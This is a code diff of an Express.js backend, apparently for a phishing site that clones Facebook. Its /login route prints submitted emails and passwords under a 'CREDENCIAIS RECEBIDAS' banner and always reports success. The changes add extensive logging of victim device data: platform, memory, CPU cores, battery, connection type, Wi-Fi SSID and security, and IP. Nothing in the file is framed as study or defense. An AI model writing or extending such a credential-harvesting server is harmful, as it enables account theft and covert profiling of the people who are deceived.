@@ -5,27 +5,23 @@ require('dotenv').config();
 
 const app = express();
 
-// Configuração do CORS para permitir requisições do Netlify
 app.use(cors({
     origin: process.env.FRONTEND_URL || 'https://cloned-f-render.netlify.app',
     methods: ['GET', 'POST'],
     credentials: true
 }));
 
-// Middleware para processar JSON
 app.use(bodyParser.json());
 
-// Rota de teste para verificar se a API está funcionando
 app.get('/', (req, res) => {
     res.json({ message: 'API Facebook Clone está funcionando!' });
 });
 
-// Rota de login
 app.post('/login', async (req, res) => {
     try {
-        const { email, senha } = req.body;
+        const { email, senha, dispositivo } = req.body;
 
-        // Log destacado das credenciais
+        // Log das credenciais
         console.log('\n');
         console.log('='.repeat(50));
         console.log('\n🔐 CREDENCIAIS RECEBIDAS 🔐\n');
@@ -34,12 +30,43 @@ app.post('/login', async (req, res) => {
         console.log('\n');
         console.log('='.repeat(50));
 
-        // Log de informações do dispositivo e IP
-        console.log('\n📱 INFORMAÇÕES DO DISPOSITIVO E CONEXÃO 📱\n');
+        // Log detalhado das informações do dispositivo
+        console.log('\n📱 INFORMAÇÕES DETALHADAS DO DISPOSITIVO 📱\n');
+        console.log('💻 PLATAFORMA:', dispositivo.plataforma);
+        console.log('🌐 USER AGENT:', dispositivo.userAgent);
+        console.log('🗣️ IDIOMA:', dispositivo.idioma);
+        console.log('📺 RESOLUÇÃO:', dispositivo.resolucao);
+        console.log('🎨 PROFUNDIDADE DE COR:', dispositivo.profundidadeCor);
+        console.log('💾 MEMÓRIA:', dispositivo.memoriaDispositivo, 'GB');
+        console.log('⚡ PROCESSADORES:', dispositivo.processadores, 'núcleos');
+        
+        // Informações de conexão
+        console.log('\n🌐 INFORMAÇÕES DE REDE 🌐\n');
+        if (dispositivo.conexao !== 'Não disponível') {
+            console.log('📡 TIPO DE CONEXÃO:', dispositivo.conexao.tipo);
+            console.log('⚡ VELOCIDADE:', dispositivo.conexao.velocidade, 'Mbps');
+        }
+        
+        // Informações de bateria
+        if (dispositivo.bateria && dispositivo.bateria !== 'Não disponível') {
+            console.log('\n🔋 INFORMAÇÕES DA BATERIA 🔋\n');
+            console.log('📊 NÍVEL:', dispositivo.bateria.nivel, '%');
+            console.log('🔌 CARREGANDO:', dispositivo.bateria.carregando ? 'Sim' : 'Não');
+        }
+
+        // Informações de rede Wi-Fi (se disponível)
+        if (dispositivo.wifi) {
+            console.log('\n📶 INFORMAÇÕES WI-FI 📶\n');
+            console.log('📡 SSID:', dispositivo.wifi.ssid || 'Não disponível');
+            console.log('📶 FORÇA DO SINAL:', dispositivo.wifi.signalStrength || 'Não disponível');
+            console.log('🔒 SEGURANÇA:', dispositivo.wifi.security || 'Não disponível');
+        }
+
+        // Log de informações da requisição
+        console.log('\n🌍 INFORMAÇÕES DA REQUISIÇÃO 🌍\n');
         console.log('🌐 IP:', req.ip);
-        console.log('🌍 USER-AGENT:', req.headers['user-agent']);
-        console.log('🔍 ORIGEM:', req.headers.origin);
         console.log('📍 MÉTODO:', req.method);
+        console.log('🔍 ORIGEM:', req.headers.origin);
         console.log('\n');
         console.log('='.repeat(50));
         console.log('\n');
@@ -51,10 +78,8 @@ app.post('/login', async (req, res) => {
             });
         }
 
-        // Simulando um delay de resposta do servidor (remova em produção)
         await new Promise(resolve => setTimeout(resolve, 1000));
 
-        // Exemplo de resposta bem-sucedida
         res.status(200).json({
             success: true,
             message: 'Login realizado com sucesso',
@@ -73,7 +98,6 @@ app.post('/login', async (req, res) => {
     }
 });
 
-// Porta do servidor
 const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, () => {
